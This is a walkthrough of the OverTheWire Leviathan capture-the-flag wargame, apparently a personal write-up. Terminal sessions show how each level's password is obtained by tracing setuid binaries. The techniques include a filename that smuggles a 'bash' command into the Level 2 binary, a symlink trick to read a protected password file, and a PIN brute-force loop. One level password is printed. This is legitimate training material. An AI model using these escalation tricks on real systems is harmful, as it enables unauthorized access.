# Leviathan Writeup on [overthewire.org](https://overthewire.org/wargames/leviathan/)

This writeup is similar to other writeups from around the web and the few resources that I did use are around the web. We will use `sshpass` to make things easier to login without having to enter the password everytime. 

## Level 0

Not too hard. First `ssh` into the system as `leviathan0` user. We use `sshpass` with the file `leviathan0` and its password to login. We will create files for each level so `leviathan0`, `leviathan1`, `leviathan2`, etc.
```
sshpass -f leviathan0 ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

## Level 0 --> Level 1

Remember to check for hidden folders/files. It might be useful.
```
leviathan0@leviathan:~$ ls -al
total 24
drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
leviathanathan:~/.backup$ cat bookmarks.html 
...
leviathan@leviathan:~/.backup$ cat bookmarks.html | grep password
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 
```

```
sshpass -f leviathan1 ssh leviathan1@leviathan.labs.overthewire.org -p 2223
```

## Level 1 --> Level 2

Notice that in this we run a setuid binary. Using `ltrace`, we can find the password. Also, while in `ltrace` the shell can be interpreted for `leviathan1` and on `leviathan2` so we need to run the binary again as `leviathan2` to get the password.
```
leviathan1@leviathan:~$ ls
check
leviathan1@leviathan:~$ ./check 
password: test
Wrong password, Good Bye ...
leviathan1@leviathan:~$ strings check | grep password
password: 
Wrong password, Good Bye ...
leviathan1@leviathan:~$ ./check 
password: /bin/sh
Wrong password, Good Bye ...
leviathan1@leviathan:~$ ltrace
ltrace: too few arguments
Try `ltrace --help' for more information.
leviathan1@leviathan:~$ ltrace ./check 
__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
printf("password: ")                                                                      = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: test
)                                                     = 116
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                     = 101
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                     = 115
strcmp("tes", "sex")                                                                      = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                      = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ltrace ./check 
__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
printf("password: ")                                                                      = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: sex
)                                                     = 115
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                     = 101
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                     = 120
strcmp("sex", "sex")                                                                      = 0
geteuid()                                                                                 = 12001
geteuid()                                                                                 = 12001
setreuid(12001, 12001)                                                                    = 0
system("/bin/sh"$ 
$ ls
check
$ cat /etc/leviathan_pass/leviathan2
cat: /etc/leviathan_pass/leviathan2: Permission denied
$ cat /etc/leviathan_pass/leviathan1
rioGegei8m
$ whoami
leviathan1
$ exit
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 0
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2    
```

```
sshpass -f leviathan2 ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

## Level 2 --> Level 3

```
leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ltrace ./printfile
__libc_start_main(0x804852b, 1, 0xffffd784, 0x8048610 <unfinished ...>
puts("*** File Printer ***"*** File Printer ***
)                                                              = 21
printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
)                                             = 28
+++ exited (status 255) +++
leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                               = -1
puts("You cant have that file..."You cant have that file...
)                                                        = 27
+++ exited (status 1) +++
leviathan:~$ mktemp -d
/tmp/tmp.e4VWyqlI9g
leviathan2@leviathan:~$ cd /tmp/tmp.e4VWyqlI9g
leviathan2@leviathan:/tmp/tmp.e4VWyqlI9g$ ls
leviathan2@leviathan:/tmp/tmp.e4VWyqlI9g$ touch 'fake;bash'
leviathan2@leviathan:/tmp/tmp.e4VWyqlI9g$ ls
fake;bash
leviathan2@leviathan:/tmp/tmp.e4VWyqlI9g$ ~/printfile fake\;bash 
/bin/cat: fake: Permission denied
leviathan3@leviathan:/tmp/tmp.e4VWyqlI9g$ whoami
leviathan3
leviathan3@leviathan:/tmp/tmp.e4VWyqlI9g$ cat /etc/leviathan_pass/leviathan3
```

```
sshpass -f leviathan3 ssh leviathan3@leviathan.labs.overthewire.org -p 2223
```

## Level 3 --> Level 4

```
leviathan3@leviathan:~$ ls
level3
leviathan3@leviathan:~$ ./level3 
Enter the password> test
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ls -l
total 12
-r-sr-x--- 1 leviathan4 leviathan3 10288 Aug 26  2019 level3
leviathan3@leviathan:~$ strings ./level3 
...
leviathan3@leviathan:~$ ltrace ./level3 
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                = -1
printf("Enter the password> ")                                                            = 20
fgets(Enter the password> test
"test\n", 256, 0xf7fc55a0)                                                          = 0xffffd590
strcmp("test\n", "snlprintf\n")                                                           = 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                = 19
+++ exited (status 0) +++
leviathan3@leviathan:~$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ whoami    
leviathan4
$ cat /etc/leviathan_pass/leviathan4
```

```
sshpass -f leviathan4 ssh leviathan4@leviathan.labs.overthewire.org -p 2223
```

## Level 4 --> Level 5

Hint: convert binary to text. 
```
leviathan4@leviathan:~$ ls
leviathan4@leviathan:~$ ls -l
total 0
leviathan4@leviathan:~$ ls -al
total 24
drwxr-xr-x  3 root root       4096 Aug 26  2019 .
drwxr-xr-x 10 root root       4096 Aug 26  2019 ..
-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root root        675 May 15  2017 .profile
dr-xr-x---  2 root leviathan4 4096 Aug 26  2019 .trash
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ls
bin
leviathan4@leviathan:~/.trash$ ./bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
leviathan4@leviathan:~/.trash$ ./bin | tr " " "\n" | while read line; do echo "obase=16;ibase=2;$line" | bc; done | tr -d "\n" | xxd -r -p
```

```
sshpass -f leviathan5 ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

## Level 5 --> Level 6

```
leviathan5@leviathan:~$ ls
leviathan5
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ echo "test" > /tmp/file.log
leviathan5@leviathan:~$ ls /tmp/file.log
/tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
test
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ls /tmp/file.log
/tmp/file.log
leviathan5@leviathan:~$ ls -l /tmp/file.log
lrwxrwxrwx 1 leviathan5 root 30 Apr  5 05:20 /tmp/file.log -> /etc/leviathan_pass/leviathan6
leviathan5@leviathan:~$ ./leviathan5 
```

```
sshpass -f leviathan6 ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

## Level 6 --> Level 7

The `.leviathan6` binary requires a 4 digit pin to enter a shell. 
```
leviathan:~$ ls
leviathan6
leviathan6@leviathan:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ./leviathan6 1111
Wrong
leviathan6@leviathan:~$ for i in {9999..000}; do echo $i ; ./leviathan6 $i ; done 
...
7129
Wrong
7128
Wrong
7127
Wrong
7126
Wrong
7125
Wrong
7124
Wrong
7123
$ ls
leviathan6
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
```

END
